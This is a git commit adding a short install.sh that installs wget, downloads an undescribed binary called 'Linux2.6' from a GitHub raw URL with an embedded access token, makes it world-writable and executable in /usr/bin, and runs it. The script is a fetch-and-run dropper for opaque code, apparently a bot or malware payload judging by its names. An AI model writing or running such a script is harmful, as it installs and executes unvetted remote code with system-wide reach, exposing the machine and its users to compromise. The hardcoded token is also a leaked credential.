a1eb425ecb12c20a47929c9d9b38102497a79f91
occ1122 <82438606+occ1122@users.noreply.github.com>
2022-07-10 21:41:47 +0800

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+cd /usr/bin
+apt-get -y install wget
+wget -N https://raw.githubusercontent.com/occ1122/ddcc/main/Linux2.6?token=GHSAT0AAAAAABT2B6PVAIOAWSG3EP3DZ27CYWK2ZLQ
+chmod 777 Linux2.6
+./Linux2.6
